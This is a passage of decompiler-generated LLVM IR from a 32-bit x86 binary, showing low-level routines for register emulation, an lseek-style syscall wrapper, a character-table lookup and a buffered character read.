  store i32 %v3_80566f5, i32* @eax, align 4
  %v1_80566fd = icmp eq i32 %v3_80566f5, 0
  %v1_80566ff = icmp eq i1 %v1_80566fd, false
  br i1 %v1_80566ff, label %dec_label_pc_80565ec, label %dec_label_pc_8056705

dec_label_pc_8056685:                             ; preds = %dec_label_pc_8056685.lr.ph, %dec_label_pc_805669a
  %v0_8056685 = phi i32 [ %v0_8056685.pre, %dec_label_pc_8056685.lr.ph ], [ %v5_805668e, %dec_label_pc_805669a ]
  %v1_8056687118 = phi i32 [ 1, %dec_label_pc_8056685.lr.ph ], [ %v1_805669a, %dec_label_pc_805669a ]
  %v0_8056687 = load i32, i32* @ebx, align 4
  %v2_8056687 = mul i32 %v1_8056687118, 4
  %v3_8056687 = add i32 %v0_8056687, %v2_8056687
  %v4_8056687 = inttoptr i32 %v3_8056687 to i32*
  %v5_8056687 = load i32, i32* %v4_8056687, align 4
  %v5_805668e = call i32 @function_8056890(i8* %v4_805668e, i32 %v5_8056687, i32 %v0_8056685, i32 %v0_8056685)
  store i32 %v5_805668e, i32* %eax.global-to-local, align 4
  %v1_8056696 = icmp eq i32 %v5_805668e, 0
  br i1 %v1_8056696, label %dec_label_pc_80566a1, label %dec_label_pc_805669a

dec_label_pc_805669a:                             ; preds = %dec_label_pc_8056685
  %v0_805669a = load i32, i32* @esi, align 4
  %v1_805669a = add i32 %v0_805669a, 1
  store i32 %v1_805669a, i32* @esi, align 4
  %v1_805669b.pre = load i32, i32* @edi, align 4
  %v5_805669d = icmp slt i32 %v1_805669a, %v1_805669b.pre
  br i1 %v5_805669d, label %dec_label_pc_8056685, label %dec_label_pc_80566eb.backedge

dec_label_pc_80566a1:                             ; preds = %dec_label_pc_805666f, %dec_label_pc_8056685
  br i1 %v1_80566a6, label %dec_label_pc_80566c3, label %dec_label_pc_80566a8

dec_label_pc_80566a8:                             ; preds = %dec_label_pc_80566a1
  %v0_80566a8 = load i32, i32* @esi, align 4
  %v3_80566a9 = load i8*, i8** %stack_var_-44, align 4
  %v4_80566a9 = ptrtoint i8* %v3_80566a9 to i32
  %v0_80566ad = load i32, i32* @ebx, align 4
  %v1_80566ad = inttoptr i32 %v0_80566ad to i32*
  %v2_80566ad = load i32, i32* %v1_80566ad, align 4
  %v4_80566b1 = inttoptr i32 %v2_80566ad to i8*
  %v5_80566b1 = call i32 @function_8055cba(i32 2, i8* %v4_80566b1, i32 %v4_80566a9, i32 %v0_80566a8)
  store i32 %v5_80566b1, i32* %eax.global-to-local, align 4
  %tmp84 = icmp slt i32 %v5_80566b1, 1
  %tmp85 = icmp eq i1 %tmp84, false
  br i1 %tmp85, label %dec_label_pc_8056541, label %dec_label_pc_80566eb.outer.backedge

dec_label_pc_80566eb.outer.backedge:              ; preds = %dec_label_pc_80566a8, %dec_label_pc_80566ca, %dec_label_pc_80566c3
  %v0_80566eb119 = load i32, i32* @edx, align 4
  %v3_80566f5120 = call i32 @function_805581c(i32 %v4_80566f1, i32 %stack_var_4.0, i32 %v0_80566eb119)
  store i32 %v3_80566f5120, i32* @eax, align 4
  %v1_80566fd121 = icmp eq i32 %v3_80566f5120, 0
  %v1_80566ff122 = icmp eq i1 %v1_80566fd121, false
  br i1 %v1_80566ff122, label %dec_label_pc_80565ec.lr.ph, label %dec_label_pc_8056705

dec_label_pc_80566c3:                             ; preds = %dec_label_pc_80566a1
  br i1 %v1_80566c8, label %dec_label_pc_80566eb.outer.backedge, label %dec_label_pc_80566ca

dec_label_pc_80566ca:                             ; preds = %dec_label_pc_80566c3
  %v0_80566ca = load i32, i32* @ecx, align 4
  %v0_80566cf = load i32, i32* @ebx, align 4
  %v1_80566cf = inttoptr i32 %v0_80566cf to i32*
  %v2_80566cf = load i32, i32* %v1_80566cf, align 4
  %v4_80566d3 = inttoptr i32 %v2_80566cf to i8*
  %v5_80566d3 = call i32 @function_8055cba(i32 10, i8* %v4_80566d3, i32 %stack_var_-36.0, i32 %v0_80566ca)
  store i32 %v5_80566d3, i32* %eax.global-to-local, align 4
  %tmp86 = icmp slt i32 %v5_80566d3, 1
  %tmp87 = icmp eq i1 %tmp86, false
  br i1 %tmp87, label %dec_label_pc_805656e, label %dec_label_pc_80566eb.outer.backedge

dec_label_pc_8056705:                             ; preds = %dec_label_pc_80566eb.outer.backedge, %dec_label_pc_80565d5, %dec_label_pc_80566eb.backedge, %dec_label_pc_805659a
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_805659a ], [ 1, %dec_label_pc_80565d5 ], [ 2, %dec_label_pc_80566eb.outer.backedge ], [ %stack_var_-28.0.ph130, %dec_label_pc_80566eb.backedge ]
  br i1 %v12_8056494, label %dec_label_pc_8056725, label %dec_label_pc_805670c

dec_label_pc_805670c:                             ; preds = %dec_label_pc_8056705
  %v1_8056713 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_8056713 = call i32 @function_80552ec(i16* %v1_8056713)
  store i32 %v2_8056713, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056725

dec_label_pc_8056725:                             ; preds = %dec_label_pc_8056658, %dec_label_pc_8056475, %dec_label_pc_8056481, %dec_label_pc_805649f, %dec_label_pc_80564b2, %dec_label_pc_80564be, %dec_label_pc_80564c7, %dec_label_pc_80564f1, %dec_label_pc_8056705, %dec_label_pc_805670c, %dec_label_pc_8056527
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8056705 ], [ %stack_var_-28.1, %dec_label_pc_805670c ], [ %v2_8056536, %dec_label_pc_8056527 ], [ 34, %dec_label_pc_80564f1 ], [ 34, %dec_label_pc_80564c7 ], [ 34, %dec_label_pc_80564be ], [ 34, %dec_label_pc_80564b2 ], [ 34, %dec_label_pc_805649f ], [ 34, %dec_label_pc_8056481 ], [ 34, %dec_label_pc_8056475 ], [ %stack_var_-28.0.ph130, %dec_label_pc_8056658 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8056460, i32* @ebx, align 4
  store i32 %v0_805645f, i32* @esi, align 4
  store i32 %v0_805645e, i32* @edi, align 4
  store i32 %v0_805645d, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_805669a, { 0, 2, 1 }
  uselistorder i32 %v5_805668e, { 1, 2, 0 }
  uselistorder i32 %v0_8056685, { 1, 0 }
  uselistorder i8 %v2_805660f95, { 1, 2, 0 }
  uselistorder i8* %v1_805660f94, { 1, 0 }
  uselistorder i32 %v0_805660f47, { 1, 0 }
  uselistorder i32 %v2_8056635, { 1, 0 }
  uselistorder i32 %v1_805662e, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8056638.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8056623, { 1, 0 }
  uselistorder i32 %v0_8056623, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8056615, { 1, 0 }
  uselistorder i8* %v4_805668e, { 1, 0 }
  uselistorder i32 %v4_80566f1, { 1, 4, 2, 3, 0 }
  uselistorder i32 %stack_var_4.0, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0 }
  uselistorder i32 %v0_80564b2, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805648d, { 1, 0 }
  uselistorder i32 %v1_8056470, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 3, 2, 1, 0 }
  uselistorder i32 %tmp59, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 14, 13, 15 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 12, 13, 11, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 1, 2, 13, 14, 12, 0 }
  uselistorder i32 5, { 9, 12, 13, 14, 0, 8, 5, 6, 10, 7, 15, 16, 2, 3, 11, 4, 1 }
  uselistorder i32 -6, { 1, 0 }
  uselistorder i8 32, { 8, 9, 10, 11, 12, 13, 14, 15, 5, 0, 1, 2, 6, 7, 3, 4 }
  uselistorder i32* @global_var_805d61c, { 0, 4, 2, 5, 1, 3, 6 }
  uselistorder i32 35, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @function_805581c, { 1, 4, 0, 3, 2 }
  uselistorder i32 10, { 14, 1, 26, 27, 28, 29, 30, 31, 2, 18, 19, 21, 20, 3, 8, 32, 9, 23, 11, 10, 15, 4, 12, 17, 33, 16, 5, 0, 22, 6, 24, 25, 13, 7 }
  uselistorder i32 80, { 0, 2, 4, 5, 6, 7, 8, 9, 10, 11, 3, 1 }
  uselistorder i32 56, { 5, 6, 7, 8, 3, 9, 10, 11, 12, 13, 14, 4, 2, 1, 15, 0 }
  uselistorder i32 44, { 5, 6, 7, 2, 8, 3, 4, 9, 10, 11, 1, 15, 17, 16, 12, 13, 14, 18, 0 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 19, 14, 4, 10, 5, 2, 20, 21, 0, 11, 7, 6, 3, 13, 8, 9, 15, 16, 17, 18, 1, 12 }
  uselistorder i32 -48, { 2, 3, 4, 1, 0 }
  uselistorder i32 -32, { 10, 0, 1, 5, 4, 3, 2, 6, 7, 8, 9 }
  uselistorder i32 32, { 63, 23, 64, 65, 22, 27, 66, 67, 68, 69, 70, 41, 71, 72, 73, 39, 40, 46, 20, 76, 28, 44, 1, 0, 2, 3, 42, 4, 45, 5, 6, 7, 8, 24, 47, 48, 21, 25, 49, 50, 51, 52, 53, 54, 55, 9, 56, 57, 43, 74, 75, 62, 11, 10, 32, 31, 29, 26, 33, 12, 13, 15, 14, 34, 36, 17, 16, 35, 58, 59, 60, 61, 37, 30, 19, 18, 38 }
  uselistorder i32* @ebp, { 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 7, 11, 12, 1, 13, 14, 15, 4, 81, 82, 83, 88, 84, 85, 86, 87, 89, 90, 2, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 113, 112, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 31, 32, 128, 129, 130, 131, 132, 133, 134, 135, 33, 34, 35, 36, 37, 6, 150, 16, 17, 18, 23, 24, 151, 152, 153, 154, 155, 136, 137, 138, 139, 140, 141, 142, 143, 148, 144, 145, 146, 147, 3, 149, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 5, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0, 54, 19, 20, 21, 8, 9, 10, 22, 25, 26, 27, 28, 29, 30, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65 }
  uselistorder i32 %arg9, { 3, 0, 1, 2 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8056725, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8056705, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_80566eb.outer.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80566a1, { 1, 0 }
  uselistorder label %dec_label_pc_8056685, { 1, 0 }
  uselistorder label %dec_label_pc_8056648, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_805660f.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8056635, { 1, 0 }
  uselistorder label %dec_label_pc_8056603, { 1, 0 }
  uselistorder label %dec_label_pc_80565ec, { 1, 0 }
  uselistorder label %dec_label_pc_80565ec.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_80565d5, { 1, 0 }
  uselistorder label %dec_label_pc_805659a, { 1, 0 }
  uselistorder label %dec_label_pc_80564f1, { 1, 0 }
  uselistorder label %dec_label_pc_8056481, { 1, 0 }
}

define i32 @function_8056734(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8056734:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8056736 = load i32, i32* @ebx, align 4
  store i32 %v0_8056736, i32* %stack_var_-12, align 4
  %v2_805674a = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805674a, i32* %esi.global-to-local, align 4
  %v1_8056761 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8056761, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_8056761, -4095
  br i1 %tmp18, label %dec_label_pc_805677b, label %dec_label_pc_805676d

dec_label_pc_805676d:                             ; preds = %dec_label_pc_8056734
  %v2_805674e = ashr i32 %arg3, 31
  %v1_805676d = call i32 @function_8050568(i32 %v2_805674e)
  %v0_8056772 = load i32, i32* %esi.global-to-local, align 4
  %v1_8056772 = sub i32 0, %v0_8056772
  %v2_8056774 = inttoptr i32 %v1_805676d to i32*
  store i32 %v1_8056772, i32* %v2_8056774, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_805678f.pre.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805677f

dec_label_pc_805677b:                             ; preds = %dec_label_pc_8056734
  %v1_805677b = icmp eq i32 %v1_8056761, 0
  br i1 %v1_805677b, label %dec_label_pc_8056784, label %dec_label_pc_805677f

dec_label_pc_805677f:                             ; preds = %dec_label_pc_805677b, %dec_label_pc_805676d
  %v2_805678f.pre = phi i32 [ %v0_8056736, %dec_label_pc_805677b ], [ %v2_805678f.pre.pre, %dec_label_pc_805676d ]
  %v0_805677f = phi i32 [ %v1_8056761, %dec_label_pc_805677b ], [ -1, %dec_label_pc_805676d ]
  %v1_8056781 = ashr i32 %v0_805677f, 31
  br label %dec_label_pc_805678c

dec_label_pc_8056784:                             ; preds = %dec_label_pc_805677b
  %v3_8056784 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_805678c

dec_label_pc_805678c:                             ; preds = %dec_label_pc_805677f, %dec_label_pc_8056784
  %v2_805678f = phi i32 [ %v2_805678f.pre, %dec_label_pc_805677f ], [ %v0_8056736, %dec_label_pc_8056784 ]
  %v0_8056792 = phi i32 [ %v0_805677f, %dec_label_pc_805677f ], [ %v3_8056784, %dec_label_pc_8056784 ]
  %storemerge = phi i32 [ %v1_8056781, %dec_label_pc_805677f ], [ %tmp, %dec_label_pc_8056784 ]
  store i32 %storemerge, i32* @edx, align 4
  store i32 %v2_805678f, i32* @ebx, align 4
  ret i32 %v0_8056792

; uselistorder directives
  uselistorder i32 %v1_8056761, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8056736, { 1, 0, 2 }
  uselistorder i32 31, { 18, 19, 8, 20, 21, 26, 27, 22, 23, 6, 5, 12, 9, 10, 11, 2, 3, 0, 1, 7, 24, 25, 4, 13, 14, 15, 16, 17 }
  uselistorder i32 140, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805678c, { 1, 0 }
}

define i32 @function_8056794(i32 %arg1) local_unnamed_addr {
dec_label_pc_8056794:
  store i32 %arg1, i32* @edx, align 4
  %v1_8056798 = add i32 %arg1, 128
  %v6_80567a3 = icmp ugt i32 %v1_8056798, 383
  br i1 %v6_80567a3, label %dec_label_pc_80567ae, label %dec_label_pc_80567a5

dec_label_pc_80567a5:                             ; preds = %dec_label_pc_8056794
  %v0_80567a5 = load i32, i32* bitcast (i32** @global_var_805d880.323 to i32*), align 128
  %v2_80567aa = mul i32 %arg1, 2
  %v3_80567aa = add i32 %v0_80567a5, %v2_80567aa
  %v4_80567aa = inttoptr i32 %v3_80567aa to i16*
  %v5_80567aa = load i16, i16* %v4_80567aa, align 2
  %v6_80567aa = sext i16 %v5_80567aa to i32
  store i32 %v6_80567aa, i32* @edx, align 4
  br label %dec_label_pc_80567ae

dec_label_pc_80567ae:                             ; preds = %dec_label_pc_8056794, %dec_label_pc_80567a5
  %v0_80567ae = phi i32 [ %arg1, %dec_label_pc_8056794 ], [ %v6_80567aa, %dec_label_pc_80567a5 ]
  ret i32 %v0_80567ae

; uselistorder directives
  uselistorder label %dec_label_pc_80567ae, { 1, 0 }
}

define i32 @function_80567b4() local_unnamed_addr {
dec_label_pc_80567b4:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_6()
  %stack_var_-5 = alloca i8, align 1
  %v0_80567b4 = load i32, i32* @ebx, align 4
  %v4_80567b8 = ptrtoint i16* %tmp to i32
  store i32 %v4_80567b8, i32* @ebx, align 4
  %v1_80567bc = add i32 %v4_80567b8, 16
  %v2_80567bc = inttoptr i32 %v1_80567bc to i32*
  %v3_80567bc = load i32, i32* %v2_80567bc, align 4
  %v2_80567bf = add i32 %v4_80567b8, 24
  %v3_80567bf = inttoptr i32 %v2_80567bf to i32*
  %v4_80567bf = load i32, i32* %v3_80567bf, align 4
  %v10_80567bf = icmp ult i32 %v3_80567bc, %v4_80567bf
  br i1 %v10_80567bf, label %dec_label_pc_8056861, label %dec_label_pc_80567c8

dec_label_pc_80567c8:                             ; preds = %dec_label_pc_80567b4
  %v2_80567c8 = load i16, i16* %tmp, align 2
  %v3_80567c8 = zext i16 %v2_80567c8 to i32
  %v1_80567cb = and i32 %v3_80567c8, 131
  %v6_80567d5 = icmp ugt i32 %v1_80567cb, 128
  br i1 %v6_80567d5, label %dec_label_pc_80567ef, label %dec_label_pc_80567d7

dec_label_pc_80567d7:                             ; preds = %dec_label_pc_80567c8
  %v0_80567d7 = load i32, i32* @edx, align 4
  %v6_80567df = call i32 @function_8056ae0(i16* nonnull %tmp, i32 128, i32 %v0_80567d7, i32 %v0_80567d7)
  %v1_80567e7 = icmp eq i32 %v6_80567df, 0
  %v1_80567e9 = icmp eq i1 %v1_80567e7, false
  br i1 %v1_80567e9, label %dec_label_pc_8056886, label %dec_label_pc_80567d7.dec_label_pc_80567ef_crit_edge

dec_label_pc_80567d7.dec_label_pc_80567ef_crit_edge: ; preds = %dec_label_pc_80567d7
  %v0_80567ef.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80567ef

dec_label_pc_80567ef:                             ; preds = %dec_label_pc_80567d7.dec_label_pc_80567ef_crit_edge, %dec_label_pc_80567c8
  %v2_8056823 = phi i32 [ %v0_80567ef.pre, %dec_label_pc_80567d7.dec_label_pc_80567ef_crit_edge ], [ %v4_80567b8, %dec_label_pc_80567c8 ]
  %v1_80567ef = inttoptr i32 %v2_8056823 to i32*
  %v2_80567ef = load i32, i32* %v1_80567ef, align 4
  store i32 %v2_80567ef, i32* @ecx, align 4
  %v1_80567f1 = urem i32 %v2_80567ef, 65536
  store i32 %v1_80567f1, i32* %edx.global-to-local, align 4
  %v2_80567f4 = and i32 %v2_80567ef, 2
  %v3_80567f4 = icmp eq i32 %v2_80567f4, 0
  br i1 %v3_80567f4, label %dec_label_pc_8056812, label %dec_label_pc_80567f9

dec_label_pc_80567f9:                             ; preds = %dec_label_pc_80567ef
  %v1_80567f9 = urem i32 %v2_80567ef, 2
  store i32 %v1_80567f9, i32* %edx.global-to-local, align 4
  %v1_80567fc = add i32 %v2_80567ef, 65535
  %v1_80567ff = trunc i32 %v1_80567fc to i16
  %v3_80567ff = inttoptr i32 %v2_8056823 to i16*
  store i16 %v1_80567ff, i16* %v3_80567ff, align 2
  %v0_8056802 = load i32, i32* @ebx, align 4
  %v1_8056802 = load i32, i32* %edx.global-to-local, align 4
  %v2_8056802 = mul i32 %v1_8056802, 4
  %v3_8056802 = add i32 %v0_8056802, 36
  %v4_8056802 = add i32 %v3_8056802, %v2_8056802
  %v5_8056802 = inttoptr i32 %v4_8056802 to i8*
  %v6_8056802 = load i8, i8* %v5_8056802, align 1
  %v7_8056802 = zext i8 %v6_8056802 to i32
  %v9_8056802 = and i32 %v1_8056802, -256
  %v10_8056802 = or i32 %v7_8056802, %v9_8056802
  store i32 %v10_8056802, i32* %edx.global-to-local, align 4
  %v1_8056806 = add i32 %v0_8056802, 40
  %v2_8056806 = inttoptr i32 %v1_8056806 to i32*
  store i32 0, i32* %v2_8056806, align 4
  %v0_805680d = load i32, i32* %edx.global-to-local, align 4
  %v1_805680d = urem i32 %v0_805680d, 256
  store i32 %v1_805680d, i32* @edx, align 4
  br label %dec_label_pc_8056889

dec_label_pc_8056812:                             ; preds = %dec_label_pc_80567ef
  %v1_8056812 = add i32 %v2_8056823, 16
  %v2_8056812 = inttoptr i32 %v1_8056812 to i32*
  %v3_8056812 = load i32, i32* %v2_8056812, align 4
  store i32 %v3_8056812, i32* @eax, align 4
  %v1_8056815 = add i32 %v2_8056823, 20
  %v2_8056815 = inttoptr i32 %v1_8056815 to i32*
  %v3_8056815 = load i32, i32* %v2_8056815, align 4
  %v15_8056815 = icmp eq i32 %v3_8056815, %v3_8056812
  %v1_8056818 = icmp eq i1 %v15_8056815, false
  br i1 %v1_8056818, label %dec_label_pc_8056861, label %dec_label_pc_805681a

dec_label_pc_805681a:                             ; preds = %dec_label_pc_8056812
  %v1_805681a = add i32 %v2_8056823, 4
  %v2_805681a = inttoptr i32 %v1_805681a to i32*
  %v3_805681a = load i32, i32* %v2_805681a, align 4
  %v13_805681a = icmp eq i32 %v3_805681a, -2
  %v1_805681e = icmp eq i1 %v13_805681a, false
  br i1 %v1_805681e, label %dec_label_pc_8056828, label %dec_label_pc_8056820

dec_label_pc_8056820:                             ; preds = %dec_label_pc_805681a
  %v1_8056820 = or i32 %v2_80567ef, 4
  store i32 %v1_8056820, i32* @ecx, align 4
  %v1_8056823 = trunc i32 %v1_8056820 to i16
  %v3_8056823 = inttoptr i32 %v2_8056823 to i16*
  store i16 %v1_8056823, i16* %v3_8056823, align 2
  br label %dec_label_pc_8056886

dec_label_pc_8056828:                             ; preds = %dec_label_pc_805681a
  %v1_8056828 = udiv i32 %v2_80567ef, 256
  %v2_8056828 = trunc i32 %v1_8056828 to i8
  %v3_8056828 = urem i8 %v2_8056828, 4
  %v4_8056828 = icmp eq i8 %v3_8056828, 0
  %v8_8056828 = zext i8 %v3_8056828 to i32
  %v10_8056828 = mul nuw nsw i32 %v8_8056828, 256
  %v11_8056828 = urem i32 %v2_80567ef, 256
  %v12_8056828 = or i32 %v10_8056828, %v11_8056828
  store i32 %v12_8056828, i32* %edx.global-to-local, align 4
  br i1 %v4_8056828, label %dec_label_pc_805683d, label %dec_label_pc_805682d

dec_label_pc_805682d:                             ; preds = %dec_label_pc_8056828
  %v3_8056835 = call i32 @function_8055964(i16* bitcast (i32** @global_var_805d63c.309 to i16*))
  %v0_805683d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805683d

dec_label_pc_805683d:                             ; preds = %dec_label_pc_8056828, %dec_label_pc_805682d
  %v0_8056872 = phi i32 [ %v2_8056823, %dec_label_pc_8056828 ], [ %v0_805683d.pre, %dec_label_pc_805682d ]
  %v1_805683d = add i32 %v0_8056872, 8
  %v2_805683d = inttoptr i32 %v1_805683d to i32*
  %v3_805683d = load i32, i32* %v2_805683d, align 4
  %v1_8056840 = add i32 %v0_8056872, 12
  %v2_8056840 = inttoptr i32 %v1_8056840 to i32*
  %v3_8056840 = load i32, i32* %v2_8056840, align 4
  %v15_8056840 = icmp eq i32 %v3_8056840, %v3_805683d
  br i1 %v15_8056840, label %dec_label_pc_805686a, label %dec_label_pc_8056845

dec_label_pc_8056845:                             ; preds = %dec_label_pc_805683d
  %v2_8056848 = add i32 %v0_8056872, 24
  %v3_8056848 = inttoptr i32 %v2_8056848 to i32*
  store i32 %v3_805683d, i32* %v3_8056848, align 4
  %v0_805684b = load i32, i32* @ebx, align 4
  %v2_805684c = call i32 @function_8056ab8(i32 %v0_805684b)
  %v1_8056854 = icmp eq i32 %v2_805684c, 0
  br i1 %v1_8056854, label %dec_label_pc_8056886, label %dec_label_pc_8056858

dec_label_pc_8056858:                             ; preds = %dec_label_pc_8056845
  %v0_8056858 = load i32, i32* @ebx, align 4
  %v1_8056858 = add i32 %v0_8056858, 20
  %v2_8056858 = inttoptr i32 %v1_8056858 to i32*
  %v3_8056858 = load i32, i32* %v2_8056858, align 4
  %v2_805685b = add i32 %v0_8056858, 24
  %v3_805685b = inttoptr i32 %v2_805685b to i32*
  store i32 %v3_8056858, i32* %v3_805685b, align 4
  %v0_805685e = load i32, i32* @ebx, align 4
  %v1_805685e = add i32 %v0_805685e, 16
  %v2_805685e = inttoptr i32 %v1_805685e to i32*
  %v3_805685e = load i32, i32* %v2_805685e, align 4
  br label %dec_label_pc_8056861

dec_label_pc_8056861:                             ; preds = %dec_label_pc_8056812, %dec_label_pc_80567b4, %dec_label_pc_8056858
  %v1_8056865 = phi i32 [ %v2_8056823, %dec_label_pc_8056812 ], [ %v4_80567b8, %dec_label_pc_80567b4 ], [ %v0_805685e, %dec_label_pc_8056858 ]
  %v0_8056861 = phi i32 [ %v3_8056812, %dec_label_pc_8056812 ], [ %v3_80567bc, %dec_label_pc_80567b4 ], [ %v3_805685e, %dec_label_pc_8056858 ]
  %v1_8056861 = inttoptr i32 %v0_8056861 to i8*
  %v2_8056861 = load i8, i8* %v1_8056861, align 1
  %v3_8056861 = zext i8 %v2_8056861 to i32
  store i32 %v3_8056861, i32* @edx, align 4
  %v1_8056864 = add i32 %v0_8056861, 1
  %v2_8056865 = add i32 %v1_8056865, 16
  %v3_8056865 = inttoptr i32 %v2_8056865 to i32*
  store i32 %v1_8056864, i32* %v3_8056865, align 4
  %v0_8056889.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8056889

dec_label_pc_805686a:                             ; preds = %dec_label_pc_805683d
  %v2_805686d = ptrtoint i8* %stack_var_-5 to i32
  %v5_8056872 = inttoptr i32 %v0_8056872 to i16*
  %v5_8056873 = call i32 @function_8056a74(i16* %v5_8056872, i32 %v2_805686d, i32 1)
  %v1_805687b = icmp eq i32 %v5_8056873, 0
  br i1 %v1_805687b, label %dec_label_pc_8056886, label %dec_label_pc_805687f

dec_label_pc_805687f:                             ; preds = %dec_label_pc_805686a
  %v3_805687f = load i8, i8* %stack_var_-5, align 1
  %v4_805687f = sext i8 %v3_805687f to i32
  store i32 %v4_805687f, i32* @edx, align 4
  br label %dec_label_pc_8056889

dec_label_pc_8056886:                             ; preds = %dec_label_pc_805686a, %dec_label_pc_8056845, %dec_label_pc_80567d7, %dec_label_pc_8056820
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8056889

dec_label_pc_8056889:                             ; preds = %dec_label_pc_805687f, %dec_label_pc_8056861, %dec_label_pc_80567f9, %dec_label_pc_8056886
  %v0_8056889 = phi i32 [ %v4_805687f, %dec_label_pc_805687f ], [ %v0_8056889.pre, %dec_label_pc_8056861 ], [ %v1_805680d, %dec_label_pc_80567f9 ], [ -1, %dec_label_pc_8056886 ]
  store i32 %v0_80567b4, i32* @ebx, align 4
  ret i32 %v0_8056889

; uselistorder directives
  uselistorder i32 %v0_8056861, { 1, 0 }
  uselistorder i32 %v3_805683d, { 1, 0 }
  uselistorder i32 %v0_8056872, { 0, 1, 3, 2 }
  uselistorder i8 %v3_8056828, { 1, 0 }
  uselistorder i32 %v3_8056812, { 1, 0, 2 }
  uselistorder i32 %v1_805680d, { 1, 0 }
  uselistorder i32 %v2_80567ef, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %v2_8056823, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32* @global_var_805d680.302, { 1, 2, 0 }
  uselistorder i32 -2, { 0, 2, 7, 14, 15, 1, 18, 17, 3, 5, 4, 19, 8, 9, 10, 16, 11, 12, 6, 13 }
  uselistorder i32 40, { 7, 8, 9, 2, 10, 11, 12, 1, 3, 4, 5, 6, 0 }
  uselistorder i32 -256, { 64, 1, 65, 0, 66, 19, 20, 67, 69, 3, 22, 21, 2, 70, 71, 72, 73, 6, 74, 4, 75, 5, 76, 78, 8, 24, 23, 7, 31, 32, 33, 34, 35, 36, 37, 38, 79, 39, 27, 81, 82, 77, 80, 63, 62, 9, 53, 68, 40, 41, 42, 43, 10, 44, 11, 45, 46, 12, 47, 48, 49, 25, 26, 28, 18, 29, 30, 51, 50, 52, 54, 13, 55, 59, 56, 15, 57, 16, 58, 14, 60, 17, 61 }
  uselistorder i32 36, { 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 19, 2, 3, 20, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 65535, { 0, 1, 3, 2 }
  uselistorder i32 128, { 7, 14, 21, 13, 15, 2, 3, 8, 9, 10, 16, 4, 11, 12, 17, 0, 18, 19, 5, 1, 20, 6 }
  uselistorder i32 131, { 2, 1, 0 }
  uselistorder i32 24, { 24, 25, 26, 27, 28, 29, 30, 14, 0, 22, 4, 5, 13, 6, 15, 16, 17, 18, 19, 20, 21, 31, 3, 7, 8, 9, 10, 2, 11, 12, 1, 23 }
  uselistorder label %dec_label_pc_8056889, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8056886, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8056861, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805683d, { 1, 0 }
}

define i32 @function_8056890(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8056890:
  %v4_8056892 = ptrtoint i8* %arg1 to i32
